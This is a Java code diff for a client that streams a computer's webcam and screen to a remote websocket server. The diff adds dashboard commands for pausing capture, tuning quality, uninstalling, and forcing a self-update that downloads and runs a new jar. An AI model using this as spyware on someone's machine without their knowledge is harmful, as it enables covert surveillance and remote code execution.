@@ -26,16 +26,20 @@ import org.java_websocket.handshake.ServerHandshake;
 public class CameraClient {
 
     static final String SERVER_URL    = "wss://pccon.onrender.com";
-    static final int    CAM_FPS       = 30;
-    static final int    SCREEN_FPS    = 15;
-    static final int    CAM_QUALITY   = 92;    // camera JPEG quality
-    static final int    SCREEN_QUALITY = 85;   // screen JPEG quality
-    static final int    SCREEN_WIDTH  = 1280;  // scale screen down before encoding
     static final int    RECONNECT_SEC = 5;
 
-    // Self-update: upload new jar to GitHub Releases as "camera-client.jar"
+    // Self-update
     static final String UPDATE_URL = "https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar";
-    static final String VERSION    = "1.9"; // bump this string each time you release
+    static final String VERSION    = "2.3";
+
+    // Runtime-adjustable settings (dashboard can change these via commands)
+    static volatile int     camFps        = 30;
+    static volatile int     screenFps     = 15;
+    static volatile int     camQuality    = 92;
+    static volatile int     screenQuality = 92;
+    static volatile int     screenWidth   = 1920;
+    static volatile boolean camPaused     = false;
+    static volatile boolean screenPaused  = false;
 
     static volatile CameraWebSocket ws;
     static volatile boolean reconnecting = false;
@@ -43,7 +47,6 @@ public class CameraClient {
     static String pcId;
     static boolean hasCamera = false;
     static OpenCVFrameGrabber grabber;
-
     public static void main(String[] args) throws Exception {
         checkForUpdate();
         pcId = InetAddress.getLocalHost().getHostName();
@@ -122,7 +125,6 @@ public class CameraClient {
 
     static void checkForUpdate() {
         try {
-            // Check version.txt in the release to compare
             URL versionUrl = new URL(UPDATE_URL.replace("camera-client.jar", "version.txt"));
             HttpURLConnection conn = (HttpURLConnection) versionUrl.openConnection();
             conn.setConnectTimeout(5000);
@@ -132,20 +134,29 @@ public class CameraClient {
             String latest = new String(conn.getInputStream().readAllBytes()).trim();
             if (latest.equals(VERSION)) { System.out.println("[*] Up to date (v" + VERSION + ")"); return; }
             System.out.println("[*] Update available: v" + latest + " (current: v" + VERSION + ") — downloading...");
+            downloadAndReplace();
+        } catch (Exception e) {
+            System.out.println("[*] Update check failed: " + e.getMessage());
+        }
+    }
 
-            // Download new jar next to current jar
+    // Force re-download and replace regardless of version — triggered by dashboard Update button
+    static void forceUpdate() {
+        System.out.println("[*] Force update triggered from dashboard...");
+        try { downloadAndReplace(); }
+        catch (Exception e) { System.out.println("[*] Force update failed: " + e.getMessage()); }
+    }
+
+    static void downloadAndReplace() throws Exception {
             File self = new File(CameraClient.class.getProtectionDomain().getCodeSource().getLocation().toURI());
             File newJar = new File(self.getParent(), "camera-client-update.jar");
-            // Clean up any previous failed update attempt
             if (newJar.exists()) newJar.delete();
             HttpURLConnection dl = (HttpURLConnection) new URL(UPDATE_URL).openConnection();
             dl.setInstanceFollowRedirects(true);
             try (InputStream in = dl.getInputStream(); FileOutputStream out = new FileOutputStream(newJar)) {
                 in.transferTo(out);
             }
-            System.out.println("[*] Downloaded update. Relaunching...");
-
-            // Replace self and relaunch
+            System.out.println("[*] Downloaded. Relaunching...");
             File backup = new File(self.getParent(), "camera-client-old.jar");
             if (backup.exists()) backup.delete();
             if (!self.renameTo(backup)) {
@@ -161,9 +172,6 @@ public class CameraClient {
             new ProcessBuilder("java", "--enable-native-access=ALL-UNNAMED", "-jar", self.getAbsolutePath())
                 .inheritIO().start();
             System.exit(0);
-        } catch (Exception e) {
-            System.out.println("[*] Update check failed: " + e.getMessage());
-        }
     }
 
     /**
@@ -201,23 +209,31 @@ public class CameraClient {
     }
 
     static void startCameraLoop() {
-        long intervalMs = 1000L / CAM_FPS;
         Java2DFrameConverter converter = new Java2DFrameConverter();
-
-        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
-            try {
-                if (paused || ws == null || !ws.isOpen()) return;
-                Frame frame = grabber.grab();
-                if (frame == null || frame.image == null) return;
-                BufferedImage img = converter.convert(frame);
-                if (img == null) return;
-                String b64 = toBase64(img, CAM_QUALITY);
-                if (b64 == null) return;
-                ws.send("{\"type\":\"frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
-            } catch (Exception e) {
-                System.err.println("[!] Camera error: " + e.getMessage());
+        Thread t = new Thread(() -> {
+            while (true) {
+                long start = System.currentTimeMillis();
+                try {
+                    if (!paused && !camPaused && ws != null && ws.isOpen()) {
+                        Frame frame = grabber.grab();
+                        if (frame != null && frame.image != null) {
+                            BufferedImage img = converter.convert(frame);
+                            if (img != null) {
+                                String b64 = toBase64(img, camQuality);
+                                if (b64 != null) ws.send("{\"type\":\"frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
+                            }
+                        }
+                    }
+                } catch (Exception e) {
+                    System.err.println("[!] Camera error: " + e.getMessage());
+                }
+                long elapsed = System.currentTimeMillis() - start;
+                long sleep = (1000L / camFps) - elapsed;
+                if (sleep > 0) try { Thread.sleep(sleep); } catch (InterruptedException ignored) {}
             }
-        }, 0, intervalMs, TimeUnit.MILLISECONDS);
+        }, "CameraLoop");
+        t.setDaemon(true);
+        t.start();
     }
 
     static void startScreenLoop() {
@@ -229,30 +245,28 @@ public class CameraClient {
             return;
         }
         Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-        long intervalMs = 1000L / SCREEN_FPS;
 
-        // Self-scheduling thread: next frame starts only after current one is sent.
-        // scheduleAtFixedRate would queue up frames if encoding falls behind, killing FPS.
         Thread t = new Thread(() -> {
             while (true) {
                 long start = System.currentTimeMillis();
                 try {
-                    if (!paused && ws != null && ws.isOpen()) {
+                    if (!paused && !screenPaused && ws != null && ws.isOpen()) {
                         BufferedImage raw = robot.createScreenCapture(screen);
-                        int scaledH = (int) ((double) raw.getHeight() / raw.getWidth() * SCREEN_WIDTH);
-                        java.awt.image.BufferedImage scaled = new java.awt.image.BufferedImage(SCREEN_WIDTH, scaledH, java.awt.image.BufferedImage.TYPE_INT_RGB);
+                        int sw = screenWidth;
+                        int scaledH = (int) ((double) raw.getHeight() / raw.getWidth() * sw);
+                        java.awt.image.BufferedImage scaled = new java.awt.image.BufferedImage(sw, scaledH, java.awt.image.BufferedImage.TYPE_INT_RGB);
                         java.awt.Graphics2D g = scaled.createGraphics();
                         g.setRenderingHint(java.awt.RenderingHints.KEY_INTERPOLATION, java.awt.RenderingHints.VALUE_INTERPOLATION_BILINEAR);
-                        g.drawImage(raw, 0, 0, SCREEN_WIDTH, scaledH, null);
+                        g.drawImage(raw, 0, 0, sw, scaledH, null);
                         g.dispose();
-                        String b64 = toBase64(scaled, SCREEN_QUALITY);
+                        String b64 = toBase64(scaled, screenQuality);
                         if (b64 != null) ws.send("{\"type\":\"screen_frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
                     }
                 } catch (Exception e) {
                     System.err.println("[!] Screen error: " + e.getMessage());
                 }
                 long elapsed = System.currentTimeMillis() - start;
-                long sleep = intervalMs - elapsed;
+                long sleep = (1000L / screenFps) - elapsed;
                 if (sleep > 0) try { Thread.sleep(sleep); } catch (InterruptedException ignored) {}
             }
         }, "ScreenLoop");
@@ -310,8 +324,45 @@ public class CameraClient {
         CameraWebSocket(URI uri) { super(uri); }
         @Override public void onOpen(ServerHandshake h) {}
         @Override public void onMessage(String msg) {
-            if (msg.contains("\"uninstall\"")) runUninstall();
-            if (msg.contains("\"update\""))    checkForUpdate();
+            try {
+                String type = extractStr(msg, "type");
+                if (type == null) return;
+                switch (type) {
+                    case "uninstall"          -> runUninstall();
+                    case "update"             -> checkForUpdate();
+                    case "force_update"       -> forceUpdate();
+                    case "cam_pause"          -> { camPaused = true;  System.out.println("[*] Camera paused"); }
+                    case "cam_resume"         -> { camPaused = false; System.out.println("[*] Camera resumed"); }
+                    case "screen_pause"       -> { screenPaused = true;  System.out.println("[*] Screen paused"); }
+                    case "screen_resume"      -> { screenPaused = false; System.out.println("[*] Screen resumed"); }
+                    case "set_cam_fps"        -> { int v = extractInt(msg, "value"); if (v > 0 && v <= 60)   camFps = v; }
+                    case "set_screen_fps"     -> { int v = extractInt(msg, "value"); if (v > 0 && v <= 30)   screenFps = v; }
+                    case "set_cam_quality"    -> { int v = extractInt(msg, "value"); if (v >= 10 && v <= 100) camQuality = v; }
+                    case "set_screen_quality" -> { int v = extractInt(msg, "value"); if (v >= 10 && v <= 100) screenQuality = v; }
+                    case "set_screen_width"   -> { int v = extractInt(msg, "value"); if (v >= 320 && v <= 3840) screenWidth = v; }
+                }
+            } catch (Exception e) { /* ignore malformed */ }
+        }
+
+        // minimal JSON field extractors — avoids adding a JSON dep
+        String extractStr(String json, String key) {
+            String search = "\"" + key + "\"";
+            int i = json.indexOf(search);
+            if (i < 0) return null;
+            i = json.indexOf('"', i + search.length() + 1);
+            if (i < 0) return null;
+            int j = json.indexOf('"', i + 1);
+            return j < 0 ? null : json.substring(i + 1, j);
+        }
+        int extractInt(String json, String key) {
+            String search = "\"" + key + "\"";
+            int i = json.indexOf(search);
+            if (i < 0) return -1;
+            i += search.length();
+            while (i < json.length() && !Character.isDigit(json.charAt(i))) i++;
+            int j = i;
+            while (j < json.length() && Character.isDigit(json.charAt(j))) j++;
+            return i == j ? -1 : Integer.parseInt(json.substring(i, j));
         }
         @Override public void onClose(int code, String reason, boolean remote) {
             System.out.println("[*] Disconnected: " + reason);
